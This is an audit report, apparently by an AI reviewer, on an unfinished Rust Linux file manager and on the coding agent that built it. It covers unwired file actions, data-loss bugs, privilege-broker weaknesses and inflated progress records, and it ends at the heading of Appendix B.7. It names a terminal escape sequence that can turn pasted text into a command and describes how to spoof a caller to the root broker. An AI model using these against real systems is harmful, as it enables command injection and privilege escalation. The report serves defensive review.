# Musheen adversarial audit (Opus)

- **Date:** 2026-09-22
- **Reviewer:** Claude Opus 5.5 (Claude Code), with four read-only sub-reviewers
- **Target:** branch `feature/full-implementation`, commit `77dedb5` ("fix(remote): retry maintenance startup")
- **Worktree:** `~/.config/superpowers/worktrees/musheen/full-implementation`
- **Mode:** read-only. No file in the worktree was changed. Builds, tests, and app runs used a separate target directory and separate XDG config directories.

Codex was still committing to the worktree during this review. Findings refer to `77dedb5`.

## Contents

1. [Verdict](#1-verdict)
2. [What was verified and how](#2-what-was-verified-and-how)
3. [Critical findings](#3-critical-findings)
4. [Data-safety findings](#4-data-safety-findings)
5. [Security findings](#5-security-findings)
6. [Architecture and performance](#6-architecture-and-performance)
7. [Process findings](#7-process-findings)
8. [Scope delivered](#8-scope-delivered)
9. [Recommended next steps](#9-recommended-next-steps)
10. [Limits of this audit](#10-limits-of-this-audit)
11. [Appendix A: UI architecture and wiring review](#appendix-a-ui-architecture-and-wiring-review)
12. [Appendix B: operations and local data-safety review](#appendix-b-operations-and-local-data-safety-review)
13. [Appendix C: desktop, remote and security review](#appendix-c-desktop-remote-and-security-review)
14. [Appendix D: spec, parity and process review](#appendix-d-spec-parity-and-process-review)
15. [Appendix E: commands and raw results](#appendix-e-commands-and-raw-results)

## 1. Verdict

Musheen is not yet a usable file manager. After three days, the branch holds about 118,000 lines of Rust and 862 passing tests. But on the test machine:

- In some runs, the app did not show the folder it starts in (trigger not isolated).
- File names are drawn at about 10 px in tall WinUI-style rows.
- It cannot copy, paste, rename, delete, or create a folder.
- You cannot open a folder by double-clicking it or pressing Enter.

A large share of the work hardened backend code that no user action can reach. `main` still contains only `println!("Hello, world!")`. All real work is on `feature/full-implementation`.

## 2. What was verified and how

### 2.1 Checks run by the lead reviewer

| Check | Result |
|---|---|
| `cargo build --locked` | Fails to link on this host: `mold: fatal: library not found: acl`. `libacl1-dev` is not installed. `ci/linux-build.Dockerfile` installs it, so Codex only built inside Docker. |
| `cargo build --locked` with `LIBRARY_PATH` pointing at a scratch symlink `libacl.so -> /usr/lib/x86_64-linux-gnu/libacl.so.1` | Pass |
| `cargo clippy --workspace --all-targets --locked -- -D warnings` (default features) | Pass |
| `cargo test --workspace --locked --no-fail-fast -- --test-threads=4` (default features) | **862 passed, 1 ignored, 46 filtered out** (107 suites, 331 s) |
| Same checks with `--all-features` | Fail: the `archive-libarchive` feature pulls in `compress-tools`, which needs `libarchive-dev`. That package is not installed here. |
| Launching the debug binary with separate XDG directories | Runs without a panic. The startup folder did not load in some runs (see 3.1). |
| After installing `libacl1-dev`, `libarchive-dev`, `libfreetype6-dev`: `cargo build --locked` with no workaround | Pass |
| After installing them: `--all-features` clippy and tests | Fail, but not at `77dedb5`. The worktree then held Codex's uncommitted OpenDAL work: modified `Cargo.toml` / `Cargo.lock` and an untracked `crates/musheen-desktop/tests/opendal_contract.rs`, which fails with `E0432` and "no variant `RemoteErrorCategory::Permanent`". The all-features checks at `77dedb5` itself were not rerun. |

The worktree's own `target/` directory has no `musheen` binary. The Dockerfile runs `cargo build` and `cargo test` with no display. So the GUI has most likely never been launched and looked at during development.

### 2.2 Findings the lead reviewer confirmed in code or at runtime

- The startup folder did not load in 5 launches, but did load in 3 later ones. The trigger is not isolated (see 3.1).
- The file list uses about 10 px text in 38 px rows (see 3.7).
- Copy, cut, paste, rename, trash, delete, and new folder are disabled (`app.rs:7187`).
- There is no double-click handler in `musheen-ui` (a grep for `click_count` and `double_click` finds nothing).
- Directory loading stops at 4,096 entries (`directory.rs:193`, `limits.rs:31`).
- The Modified column prints raw Unix seconds (`app.rs:10641`).
- Terminal paste does not strip ESC (`terminal/model.rs:181`).
- Source removal deletes entries one at a time and stops at the first error (`operation.rs:819`). This is the first half of the data-loss finding in 4.1.
- Three upstream crates are patched with no decision record (diffed against `~/.cargo/registry`).

### 2.3 Findings from sub-reviewers only

The following come from careful code reading by the sub-reviewers, not from reproduction:

- the rollback half of the Replace data-loss bug
- the access-time failure on cross-device moves
- the job-ID collision after restart
- the privilege broker findings
- the catalog I/O on the UI thread

Treat these as high-confidence leads that still need a test to prove them.

## 3. Critical findings

### 3.1 The startup folder sometimes never loads (runtime, intermittent, trigger not isolated)

**First five launches failed.** The file list showed placeholder rows and the status bar read **"0 items loaded — total unknown"** for 10 to 60 seconds. The process was idle (about 1.5 s of CPU, state `S`).

- Folders tried:
  - a 20-file folder
  - folders with 4,096, 4,097, and 5,000 files
  - `~/Documents`
- **Two conditions held in all five runs:**
  - The XDG config directory had no `kdeglobals`, so the theme read failed and fell back to Adwaita.
  - A `cargo test` run with 4 test threads was running on the machine at the same time.
- A folder did load after the user clicked a breadcrumb.

**Three later launches succeeded.** These used a copy of the user's real `kdeglobals` while the system was idle. `$HOME` (101 items) and `~/Documents` (127 items) both loaded at startup.

**What is still unknown:**

- A final run with no `kdeglobals` and an idle system was attempted. The screenshot caught another window, so that run gave no result.
- It is not known which condition is the trigger, or whether either one is.
- `start_load_for_tab` (`app.rs:3485`) looks correct as written. One lead: `this.upgrade()` in the load callback may fail if the startup entity is replaced. Commit `3823b26` ("docs: record GPUI entity caching constraint") hints at this area.

**Treat as a lead:** it needs a reproducible test before anyone fixes it.

Screenshot from a failed run: [startup-load-stuck.png](opus-audit/startup-load-stuck.png)

### 3.2 The core file verbs are not connected (code, confirmed)

`backend_action_state` (`crates/musheen-ui/src/app.rs:7187-7259`) returns `Supported` only for an allow-list. These actions are not on it:

- `Copy`
- `Cut`
- `PasteInto`
- `Rename`
- `MoveToTrash`
- `DeletePermanently`
- `NewDirectory`

They show "This command is not available in the current desktop backend".

- These actions appear only in classification lists (`app.rs:11602-11621`, `menus/builder.rs:677`), never in a handler.
- There are no Ctrl+C, Ctrl+X, Ctrl+V, Delete, or F2 bindings, although `docs/spec/ux.md:41-43` requires them.
- The backends exist and have tests: `musheen-local/src/mutation.rs` (`move_to_trash` at line 1102), `musheen-ops` rename and delete, and `musheen-desktop/src/clipboard.rs`. The UI never calls them.
- `LocalStore::mutate` returns "the foundation local provider is read-only" (`musheen-local/src/lib.rs:214`).

The only ways to copy or move a file are drag-and-drop and the "Copy To…" / "Move To…" chooser.

### 3.3 You cannot open a folder from the file list (code, confirmed)

- A row click only selects the row (`app.rs:10676-10679`).
- No double-click handler exists in `musheen-ui`.
- The file list has no Enter binding.
- Context menu "Open" on a folder starts the external default application (`execute_default_application`, `app.rs:6922`). It does not open the folder in Musheen.
- Selection is single-item only. There is no Ctrl-click or Shift-click, and `rubber_band_select` (`views/mod.rs:335`) is never called.

### 3.4 Folders stop at 4,096 entries (code, confirmed)

- `enumerate_directory` (`crates/musheen-ui/src/directory.rs:175-203`) stops when `retained >= directory_retained_items()`, which defaults to 4,096 (`musheen-core/src/limits.rs:31`).
- Nothing loads more pages when the user scrolls.
- A folder with 100,000 files shows an arbitrary 4,096 of them, then sorts those. The other files can only be found through search.
- This breaks BROWSE-019 (fetch pages ahead of the viewport).

### 3.5 The Modified column shows raw Unix seconds (code and screenshot, confirmed)

`app.rs:10640-10642`:

```rust
ColumnKey::Modified => cell.text_color(colors.muted_foreground).child(
    spec.modified_unix_seconds
        .map_or_else(|| "—".to_owned(), |value| value.to_string()),
),
```

The column shows values such as `1783529870`. It is minor alone. It matters because it shows nobody looked at the running app while about 20 commits went into archive recovery hardening.

### 3.6 Other visible UI problems (screenshot)

- The sidebar lists every block device, including unmounted partitions and `loop0` / `loop1`, as "0 B free".
- Sidebar section headers and items are centered, not left-aligned.
- The toolbar has many unlabeled icons, and some look alike (two grid icons, two checklist icons).
- Every file gets a generic icon chosen by kind, not by MIME type (`app.rs:10525`).

### 3.7 The file list text is too small, and the styling copies Windows (code and screenshot, confirmed)

The owner reported that the app "is trying to stick too close to the windows version" and that "the font is so damn small". Both are confirmed.

**What the spec says.** `docs/spec/ui.md:5-11`: "The reference does not set pixel styling. `native-theme` supplies the Linux appearance … Windows chrome and Mica are not copied." `AGENTS.md` says the same thing. The code breaks this rule.

**Font size.**

- The base font is correct. `native-theme` reads KDE Breeze's 10 pt Noto Sans and converts it to about 13.3 px. `native-theme-gpui` sets the window rem to that value (`vendor/native-theme-gpui/src/lib.rs:160-163`).
- The app then shrinks almost everything:
  - Every Details-view cell, **including the file name**, uses `.text_xs()` (0.75 rem, about **10 px**) (`app.rs:10619`).
  - List and grid names use `.text_sm()` (about 11.7 px) (`app.rs:10604`).
  - Sizes, the info pane, the status bar, and menu shortcuts use `.text_xs()`.
- There are 18 `.text_xs()` and 21 `.text_sm()` calls in `musheen-ui`. No text in the main list uses the user's base size.

**Row height.** File rows are a fixed `.h(px(38.))` (`app.rs:10653`), with `px_4` padding and rounded corners. That is WinUI-style spacing:

- tiny text in tall rows
- a fixed pixel height that ignores the font size

For comparison, Dolphin on the same desktop draws rows at the full 10 pt font in rows about 22 px tall.

**Other Windows-style choices in the screenshots:**

- Filled, pill-shaped accent buttons for the tab, the breadcrumb, "Edit location", and toolbar toggles.
- Centered sidebar headers and items.
- Text buttons ("Search", "Filter", "Command mode") next to a long row of unlabeled icons, copying the Files command bar.

**Theme fallback is always light.** When the system theme cannot be read, `install_native_theme` (`app.rs:2136-2150`) applies Adwaita dark and then Adwaita light. The second call wins, so the fallback ignores a dark desktop.

**Direction for a fix:**

1. Use the theme's base font size for file names and primary text. Keep `.text_sm()` / `.text_xs()` for secondary text only.
2. Derive row height from the font's line height plus padding, not a fixed 38 px.
3. Use Breeze or Adwaita-like density and left-aligned sidebar items.
4. Let `native-theme` widget metrics drive button shape, instead of accent-filled pills.
5. Check against Dolphin or Nautilus side by side, not against Files screenshots.

## 4. Data-safety findings

Source: Appendix B. The lead reviewer confirmed part of 4.1; the rest is from code reading.

| # | Severity | Finding | Location |
|---|---|---|---|
| 4.1 | Critical | Replace plus a move to another drive can delete the only complete copy. Source removal fails partway, the failure is reported as if the source were whole, and rollback then deletes the new destination. | `musheen-ops/src/move.rs:69-79`, `musheen-local/src/operation.rs:819-830`, `mutation.rs:679-712` |
| 4.2 | High | Cross-device moves likely fail after the copy is published. The source snapshot includes access time, and verification reads update it on `relatime` mounts. | `operation.rs:250`, `:287` |
| 4.3 | High | Job IDs restart at 1 on every launch, but status history is saved. New jobs collide, get stuck as "Running", and block later work. Staging names also repeat. | `scheduler.rs:128`, `status_center.rs:217`, `ui/operations.rs:283-290`, `:689-695` |
| 4.4 | High | The Replace backup `.musheen-restore-backup-<pid>-<n>` is not journaled and not found by recovery. After a crash, the user's original sits under a hidden name. | `mutation.rs:335` |
| 4.5 | High | No fallback when `RENAME_NOREPLACE` returns EINVAL (NFS, sshfs). Copies and moves fail after the full copy and verify. | `operation.rs:229`, `:800-805` |
| 4.6 | Medium | Moves delete the source without reporting metadata that was not preserved (breaks OPS-021). One symlink in a tree turns off metadata checks for the whole tree. | `move.rs:62-70`, `operation.rs:521-538`, `:964-999` |
| 4.7 | Medium | Source removal checks only the top-level snapshot. A file written into a subfolder between verify and removal is deleted without being copied. | `operation.rs:243-255`, `:832-849` |
| 4.8 | Medium | Filesystem work runs on the UI thread during drag hover (`statfs`, mount table parse, per-source stat, under the queue mutex). | `app.rs:8908`, `:10710`, `:7366` |
| 4.9 | Medium | Most of the ops crate is not connected to the app. Copy and move write no journal (breaks OPS-026). | `app.rs:6276`, `musheen-local/src/lib.rs:214` |

Lower-severity notes are in Appendix B.

## 5. Security findings

Source: Appendix C. The lead reviewer confirmed 5.5.

| # | Severity | Finding | Location |
|---|---|---|---|
| 5.1 | High (plausible) | The root broker takes the caller's pid, uid, and start time from request JSON, not from the kernel. A request can name a live root process, and polkit always authorizes uid 0. | `privilege/request.rs:94-134`, `privilege/polkit.rs:93-100` |
| 5.2 | High | The pkexec prompt shows only the broker command; the real target arrives later on stdin. `RunExecutable` accepts user-writable executables, checked by dev/inode/mode, not content. The broker path falls back to a PATH search. | `broker.rs:418-427`, `:1080-1090`, `:1236`, `bin/musheen-broker.rs:83-86`, `musheen-ui/src/elevated_browser.rs:367-370` |
| 5.3 | Medium | The root "capability" is unsigned JSON. Its grant ID and expiry add no security. | `rooted_store.rs:15-23`, `:100-117`, `broker.rs:1213` |
| 5.4 | High (function) | No polkit `.policy` file ships, so `org.musheen.*` actions are not registered. The polkit path most likely always fails. | `request.rs:57-63` |
| 5.5 | Medium (confirmed) | `encode_paste` strips NUL but not ESC. Clipboard text with `\x1b[201~` ends bracketed paste early and runs the rest as a command. | `terminal/model.rs:180-184` |
| 5.6 | Medium | Mount, unlock, and power-off have a 2-second deadline. LUKS unlock and polkit prompts take longer, so the UI reports failure while UDisks finishes. The unlock passphrase is never zeroed. | `volumes/runtime.rs:328`, `volumes/mod.rs:23`, `udisks.rs:634-680`, `app.rs:1346-1351` |
| 5.7 | Medium | Hand-written HTTP, WebDAV, FTP, SOCKS5, and HTTP CONNECT code. It is careful, but header reading has no line limit and FTPS is implicit-TLS only. Changing a profile to a pinned certificate needs no confirmation. | `remote/probe.rs:233-700`, `connection.rs:100-108` |
| 5.8 | Low/Medium | The zip zstd memory budget reads only the first frame; the vendored `decoder_memory_usage` returns 0 for several codecs. | `archive/zip_codec.rs:233-251`, `vendor/sevenz-rust2/src/decoder.rs` |
| 5.9 | Medium (function) | Archive extraction is safe but refuses any symlink or hardlink entry, drops modes and mtimes, and treats `\` as a separator. 7z solid extraction is quadratic. | `extract.rs:175-195`, `:590`, `:838-857`, `seven_codec.rs:184-245` |
| 5.10 | Low | The info pane's "Open With…" calls `open::that` directly. It skips the launcher checks and blocks the UI thread. | `musheen-ui/src/app.rs:10170` |

**Checked and found clean:**

- `.desktop` Exec parsing
- custom actions
- terminal working-directory handling
- secret redaction and zeroing
- remote error messages (no credentials)
- the sevenz-rust2 patch
- `musheen-zstd-budget`
- Ed25519-signed update metadata
- sandboxed thumbnail decoding

No custom cryptography was found; TLS uses rustls.

## 6. Architecture and performance

- **God object.**
  - `crates/musheen-ui/src/app.rs` is 18,488 lines (about 11,830 of code and 6,650 of tests).
  - `MusheenApp` has about 95 fields.
  - One `impl` block covers lines 2670 to 11137, about 285 methods, and includes a render path of about 2,000 lines.
- **Three overlapping dispatch layers.** `dispatch_command` → `dispatch_context_entry` → `dispatch_typed_context_command`, plus `dispatch_action` and the `backend_action_state` allow-list. This is why missing verbs fail quietly.
- **Test hook in production code.** `dispatch_command` returns early when a test probe is set (`app.rs:4066-4074`).
- **Catalog I/O on the UI thread.** `apply_directory_result` and `apply_watch_event` call `CatalogStore::update`, which reads the whole JSON catalog, takes a blocking `flock`, and may rewrite the file (`app.rs:3665-3697`, `musheen-desktop/src/catalog/mod.rs:201`). Extracting 10,000 files into the open folder causes about 20,000 catalog reads on the UI thread.
- **Re-sorting per row per frame.** `item_render_spec` calls `visible_items()`, which filters and sorts every item, once per rendered row (`app.rs:10501`, `views/mod.rs:291-300`).
- **Stale view after inotify overflow.** On an overflow (`Invalidated`), the view is marked incomplete and never reloaded (`views/mod.rs:421`, `app.rs:3671`).
- **Unused code:**
  - about 7,500 lines of archive create, extract, recovery, and store code (`app.rs:7252` says "no archive operation provider is installed")
  - the 995-line remote pool (`remote/pool.rs`)
  - SFTP, SMB, and NFS, which return `Unavailable`
  - the network location, which is an empty placeholder (`providers.rs:441-456`)
- **Unrecorded forks.** These are patched through `[patch.crates-io]` with no decision record:

  | Crate | Change |
  |---|---|
  | `gpui-component` 0.6.4 | 4 menu files, +259/−48, ARIA and menu direction |
  | `gpui-pre` 0.3.5 | 4 files, about 60 lines, a11y attributes |
  | `sevenz-rust2` 0.23.0 | metadata budget, password zeroing, `zlib-rs` removed |

  The next gpui-kit upgrade will drop these patches with only a Cargo warning.
- **Error handling.** Non-test code in `musheen-ui` and `musheen-core` has 0 `.unwrap()`, 349 `.expect(`, and 9 `panic!` / `unreachable!`. Nine `.expect` calls on window creation will abort the whole app if the compositor refuses a window (`app.rs:4224, 4261, 4328, 5847, 5987, 6704, 7525, 7922, 9549`).

## 7. Process findings

- **The entry gate was skipped.** `docs/superpowers/plans/README.md` says specs must be `Agreed` before implementation. Only 11 of 235 requirements are `Agreed`, all of them dependency choices. The other 224 are `Draft`.
- **Checkboxes do not match the work:**

  | Phase | Checkbox state | Actual state |
  |---|---|---|
  | 1 and 2 | none ticked | built |
  | 3 | tasks 1–4 unticked | built |
  | 6 | archive operations ticked as closed (`d5efaae`) | disabled in the UI |

  No checked box links to evidence.
- **`main` is a guard-script loop.** Its 167 commits include:
  - 72 `test:`, 45 `review:`, 33 `fix:`, and 0 `feat:` commits
  - 31 identical "review: refresh foundation review" commits
  - 8 "test: refresh locked Linux build" commits
  - 24 fixes to regex guard scripts (`scripts/check-dep-*.mjs`) for code that did not exist yet
  - 153 of the 167 commits touch `.cairn/`; only 3 touch any `.rs` file
- **The branch hardened unused code.** It has 131 commits: 69 `fix` and 30 `feat`. Fix streaks after a single feature commit:

  | Area | Fixes in a row |
  |---|---|
  | Volumes | 12 |
  | Context menus | 9 |
  | Catalog | 9 |
  | Archive operations | 8 |
  | MIME | 5 |
  | Remote | 5 |

  It also has four identical "test: close commands and customization evidence" commits in a row.
- **The audit docs claim more than the code delivers:**
  - `docs/command-surface-matrix.md` lists clipboard, rename, trash, delete, create, compress, extract, and preview as live. All are refused at runtime.
  - `docs/safe-local-operations-audit.md` reports delete and replace as safe, but users cannot trigger delete.
  - `docs/linux-desktop-integration-audit.md` calls the privilege broker done, while the safe-ops audit says the operation queue never calls it.
- **Verification only in Docker.** Every check ran with `CARGO_BUILD_JOBS=1` in a container with no display. Docker now holds 12 `musheen-*` images of about 1.6 GB each. Across Docker as a whole, there is about 30 GB of reclaimable build cache and 34 GB of unused volumes.

## 8. Scope delivered

About 40–45% of the stated scope is delivered, and most of that is backend code users cannot reach.

**Works from the UI:**

- browsing (after the first navigation)
- search
- text preview
- properties
- Open With and MIME defaults
- tabs and dual pane
- tags and pins
- mount, unmount, and eject
- drag-and-drop copy and move
- Copy To / Move To
- trash restore and empty
- the embedded terminal
- themes and custom actions

**Missing or unreachable:**

- file verbs: copy, cut, paste, rename, trash, permanent delete, new file or folder, duplicate, links
- archives: compress, extract, and archive browsing
- stores and locations: remote stores and the network location
- missing features: undo (OPS-013), Miller columns (`Layout::Columns` renders the flat list), and image preview (text only)
- Git integration, the shelf, and cloud drives (never specified)

## 9. Recommended next steps

1. **Stop the hardening loop.** Give the agent a short, testable list. Require each item to be shown working in the running app.
2. **Fix the startup folder load.**
3. **Opening folders:** double-click and Enter.
4. **Selection:** Ctrl-click, Shift-click, and rubber-band.
5. **File verbs:** connect copy, cut, paste, trash, delete, rename, and new folder to the existing backends, with their shortcuts.
6. **Paging:** load more when the user scrolls past 4,096 entries.
7. **Dates:** show readable dates in the Modified column.
8. **Text and density:** use the base font size for file names, derive row height from the font, and drop the WinUI-style pills and spacing (see 3.7). Fix the theme fallback so it respects dark mode.
9. **Launch check:** make "launch the binary and take a screenshot" a required check for UI work. Install `libacl1-dev` (and `libarchive-dev` if that feature matters) on the host so local builds link.
10. **Before any real data:** fix 4.1 (Replace data loss), 4.3 (job IDs), and 4.2 (atime check). Test them on a real filesystem that includes a second mount, such as tmpfs to ext4.
11. **Before shipping admin features:** fix the broker identity problem (5.1) and ship a polkit policy (5.4).
12. **Terminal and volumes:** strip ESC from terminal pastes (5.5) and raise the volume timeout (5.6).
13. **Unused backends:** connect or remove the archive and remote backends; stop counting them as delivered.
14. **Refactor:** split `MusheenApp` into per-feature controllers, and move catalog I/O off the UI thread.
15. **Records:** add decision records for the three vendored forks.

## 10. Limits of this audit

- The review covers commit `77dedb5`. Codex kept committing afterward.
- GUI checks were stopped twice: once when the screen locked, and once because the owner was using the desktop. The owner's clicks during some runs caused navigation and opened a Settings window, so only non-interactive startup results are counted. The startup-load trigger (3.1) is not isolated.
- `--all-features` checks did not run because `libarchive-dev` is missing.
- Timing observations come from a debug build.
- The findings listed in 2.3 were not reproduced.

---

## Appendix A: UI architecture and wiring review

Sub-reviewer report, lightly edited. It was read-only at `77dedb5`; this reviewer did not build or test.

**Summary.** I found three blocking gaps. The app can browse, search and launch files. But you cannot enter a folder from the file list, you cannot copy, paste, delete or rename from the menus or keys, and large folders are silently cut off.

### A.1 Does it work end to end?

- **Startup, window, listing: works in code.** `src/main.rs` → `run` (`app.rs:1465`) → `start_load_for_tab` (`app.rs:3485`) lists the folder with `enumerate_directory` on a background task (`app.rs:3528`). The lead reviewer found at runtime that the first load never completes; see 3.1.
- **Entering a folder from the file list: not possible.**
  - The only click handler on a row selects it (`app.rs:10676-10679`).
  - There is no double-click handler and no Enter binding for the list.
  - `navigate()` is reached only from the sidebar, the omnibar, Back/Forward/Up, D-Bus, and the status center.
  - "Open" on a folder launches the external default application (`execute_default_application`, `app.rs:6922`).
  - Critical. Confirmed.
- **Selection: single item only.** Clicks always replace the selection (`select_item`, `app.rs:~4600`). `rubber_band_select` (`views/mod.rs:335`) is never called. High. Confirmed.
- **Opening a file: works**, through the context menu or toolbar → `execute_application` (`app.rs:6947`), which launches off the main thread.
- **Not wired:** copy, cut, paste, trash, delete, rename, new folder, compress, extract, duplicate, links, hide, copy location, share, and open in new tab.
  - `backend_action_state` (`app.rs:7187-7259`) leaves them off its list.
  - `dispatch_typed_context_command` falls through to `context.backend-unavailable` (`app.rs:6279`).
  - `OperationHub` (`operations.rs`) only exposes drop and metadata jobs.
  - There are no Ctrl+C/X/V, Delete, or F2 bindings (`app.rs:159-186`), although `docs/spec/ux.md:41-43` requires them.
  - Critical. Confirmed.
- **Network location is a placeholder.** It always returns an empty list (`providers.rs:441-456`).
- **Archive and remote browsing are not reachable.** Only local and network-discovery providers are registered (`providers.rs:155-167`). High. Confirmed.
- **Small display bugs.**
  - The Modified column shows raw Unix seconds (`app.rs:10642`).
  - File icons are chosen by kind only (`app.rs:10525`).
- A grep for `todo!`, `unimplemented!`, and `TODO` finds nothing. The gaps are hidden behind "unsupported" states instead.

### A.2 Thread model

Listing, search, the info pane, and thumbnails run in the background (`app.rs:3528, 7724`; `musheen-local/src/search.rs:35`). Blocking work still on the main thread:

- **Catalog file on every listing and watch event.**
  - Call paths:
    - `apply_directory_result` → `catalog_binding.reconcile_directory` (`app.rs:3697`)
    - `apply_watch_event` → `observe_present` / `observe_missing` (`app.rs:3665-3672`)
  - Both call `CatalogStore::update` (`musheen-desktop/src/catalog/mod.rs:201`). Each call reads and parses the JSON catalog twice, takes a blocking `flock`, and may rewrite the file.
  - A second Musheen process holding the lock freezes this UI.
  - High. Confirmed.
- **Stat on every context command.** `revalidate_context_targets` → `store.resolve_item` (`app.rs:7168`) does an `lstat` on the main thread, which freezes the UI on a hung NFS or FUSE mount. Medium. Confirmed.
- **Icon loading during render.** `content_icon` (`app.rs:10719`) is cached and only 3 names are used. Low.

### A.3 Large folders

- The list is virtualized with `uniform_list` (`app.rs:10272, 10299`).
- **Hard cap of 4,096 entries**, with no paging (`musheen-core/src/limits.rs:31`, `directory.rs:193`). The status bar says "4096 items loaded — total unknown". This breaks BROWSE-019. Critical. Confirmed.
- **Re-sorting per row per frame.** `item_render_spec` (`app.rs:10501`) → `filtered_items` → `visible_items()` filters, allocates, and sorts all items once per row, plus twice more per frame (`app.rs:10263, 10748`). Medium. Confirmed.
- **Watch events are not batched.** `extend` rebuilds a HashMap of all items per event (`views/mod.rs:240`). After an inotify overflow, the view only sets `complete = false` and never reloads (`views/mod.rs:421`, `app.rs:3671`). Medium. Confirmed.

### A.4 The `app.rs` god object

- `app.rs` has about 11,830 lines of code and a test module from line 11830 (about 6,650 lines, 72 tests).
- `MusheenApp` (`app.rs:2536-2635`) has about 95 fields.
- One `impl` block runs from line 2670 to 11137 (about 285 methods).
- Command routing has three overlapping layers.
- Pure models (`DirectoryModel`, `DirectoryViewModel`, search models, menu builder) can be tested without GPUI. Command routing and capability gating cannot.
- There is a test hook in production code (`app.rs:4066-4074`).
- Maintainability: poor. Confirmed.

### A.5 Vendored forks

| Crate | Change |
|---|---|
| `gpui-pre` 0.3.5 | 4 files, about 60 lines: `aria_has_popup`, `aria_disabled`, a test-only `activate_accessibility_for_test`. One hunk in `window/a11y/debug.rs` is mis-indented, which suggests a hand edit. |
| `gpui-component` 0.6.4 | 4 menu files, +259/−48: ARIA roles and props, `PopupMenuDirection` |

No decision record exists for either. When gpui-kit moves to newer versions, Cargo will only warn that a patch was unused, and the accessibility features will disappear. Low to medium. Confirmed.

### A.6 Tests

- **Real UI tests exist.** The tests in `app.rs` and `dialogs/properties.rs` open GPUI test windows and use `window.press`, `window.find(...).label()`, and `render_frame`.
- **Most of `crates/musheen-ui/tests/*.rs` are model-level unit tests of real logic.**
- **Source-text guards:**

  | Guard | What it checks | Weakness |
  |---|---|---|
  | `tests/workspace_boundaries.rs:57-89` | fails on the substring `std::fs` in UI or ops source | Does not stop blocking I/O; it only pushes the calls behind `Store::resolve_item` and `CatalogStore` |
  | `scripts/check-dep-001.mjs` | greps Rust source for strings such as `kdeglobals` and `gsettings` | brittle |
  | `check-dep-014.mjs` | shells out to `cargo deny` | none noted |
  | `context_menus.rs:1878, 2002` | parse `docs/command-surface-matrix.md` | none noted |

  These are cheap drift checks. None catches the missing features.
- **No test copies, pastes, trashes, or renames through the UI**, because those paths do not exist.

### A.7 Search

Search exists and works. `start_search` (`app.rs:~8010`) sends the query to `LocalStore::search`, which walks the tree on its own thread and supports name, content, MIME, size, and modified filters through a bounded channel (`musheen-local/src/search.rs:17-56`). Results are virtualized and can be cancelled. Confirmed.

### A.8 Error handling

- In non-test `musheen-ui` and `musheen-core` code: `.unwrap()` 0, `.expect(` 349 (152 in `app.rs`, 62 in `properties.rs`), `panic!` / `unreachable!` 9.
- Most `.expect` calls are translation lookups or lock-poison checks that user data cannot trigger.
- **Risky calls:**
  - Window-open `.expect` calls crash the whole app if the compositor refuses a window (`app.rs:4224, 4261, 4328, 5847, 5987, 6704, 7525, 7922, 9549`). Medium. Plausible.
  - `dispatch_local_target_command` (`app.rs:6583`) has an arm that accepts `(OpenWith, Targets)` and `(Open, OpenWith{..})` pairs that the inner match does not handle, which leads to `unreachable!`. Low to medium. Plausible.

### A.9 Judgment

This is not yet a usable file manager.

**Solid parts:**

- generation-checked async loads and cancellation
- a real operation queue with journaling and conflict handling
- working search
- a working Open / Open With path
- accessibility work

**Broken core loop:**

- no double-click or Enter to open a folder
- no multi-select
- the basic verbs report "unsupported" although their backends exist
- folders over 4,096 entries are cut off silently
- archive and remote browsing cannot be reached

About 8,500 lines of behavior sit in one struct with about 95 fields, and the catalog is read and written on the UI thread. Next steps:

1. Wire the basic verbs and keys.
2. Add scroll-driven paging.
3. Move catalog I/O off the main thread.
4. Split `MusheenApp` into per-feature controllers.

---

## Appendix B: operations and local data-safety review

Sub-reviewer report, lightly edited. It was read-only at `77dedb5`; this reviewer did not build or test. Where an effect depends on kernel or mount behavior, the report says so.

### B.1 Critical: a "Replace" move to another drive can delete the only complete copy (confirmed by code)

- **Where:** `musheen-ops/src/move.rs:69-79`, `musheen-local/src/operation.rs:819-830`, `musheen-local/src/mutation.rs:679-712`.
- **Cause:**
  - When deleting the source fails, `execute_move` reports the source as whole (`SourceState::Retained`).
  - But `remove_tree_without_crossing` deletes entries one by one and stops at the first error.
  - The Replace rollback trusts that flag (`destination_can_be_removed_for_rollback()`). It deletes the new destination and restores the old one.
- **Scenario:**
  1. Move `Photos/` from a USB drive to `~/`, where `~/Photos` exists, and pick Replace.
  2. The copy is verified and published.
  3. Source removal deletes some files, then hits EACCES or EIO.
  4. Rollback deletes the new `~/Photos`. The deleted files now exist nowhere.
- **Tests:** no test covers Replace with `LocalStore`, and nothing tests `LocalStore::remove_source`.

### B.2 High: moves between drives fail after the copy is published (code confirmed; depends on the atime mount option)

- `operation.rs:250` compares whole `EntrySnapshot`s, which include access time (`operation.rs:287`).
- `verify` reads the source again with `file_digest` / `tree_digest`. On `relatime`, that updates atime when the old atime is older than 24 hours or not newer than mtime.
- `remove_source` then returns `SourceChanged` after publishing. Most cross-drive moves end as "NeedsAttention" with the file in both places.
- No test runs the non-rename move path on a real filesystem.

### B.3 High: job IDs restart at 1 on every launch, but status history persists (confirmed)

- **Where:** `scheduler.rs:128`, `status_center.rs:217`, `ui/operations.rs:283-290`, `:689-695`.
- **Sequence after a restart:**
  1. The first drop gets job 1 and is queued. `status.register` fails with `DuplicateJob`.
  2. `start_ready` marks the job Running. Then `mark_running` fails on the old entry.
  3. The `?` drops every ready job without running it. Those jobs stay "Running" forever, block overlapping work, and use up concurrency slots.
- Staging names (`.musheen-stage-v1-{job}-{gen}`) also repeat, so crash debris causes `StagingExists` failures.
- The restart test (`ui/tests/operations.rs:141`) never submits a job after restoring.

### B.4 High: the Replace backup is invisible to recovery (confirmed)

- `mutation.rs:335` renames the existing destination to `.musheen-restore-backup-<pid>-<n>`.
- Nothing journals this, and neither startup nor `StagingPath::is_owned_path` looks for that prefix.
- After a crash, the original sits under a hidden name. `.musheen-stage-*` leftovers are never cleaned up either.

### B.5 High: no fallback when a filesystem rejects `RENAME_NOREPLACE` (code confirmed; NFS behavior from kernel knowledge)

- `operation.rs:229` and `:800-805` call `renameat_with(..., NOREPLACE)`.
- Only EXDEV and EEXIST are handled.
- NFS and FUSE without rename2 (such as sshfs) return EINVAL. The failure comes after the full copy and verify.

### B.6 Medium: moves delete the source without reporting metadata that was not preserved (confirmed; breaks OPS-021)

- `execute_move` throws away `copied.metadata()` (`move.rs:62-70`).
- One symlink in a tree adds Timestamps, Mode, Ownership, xattrs, and ACL to the skipped list for the whole operation (`operation.rs:521-538`). That turns off metadata checks for every entry (`:964-999`, `:649`).
- Lost ownership or ACLs disappear silently along with the source.

### B.7 Medium: source deletion is by path and checks only the top-level item (confirmed)

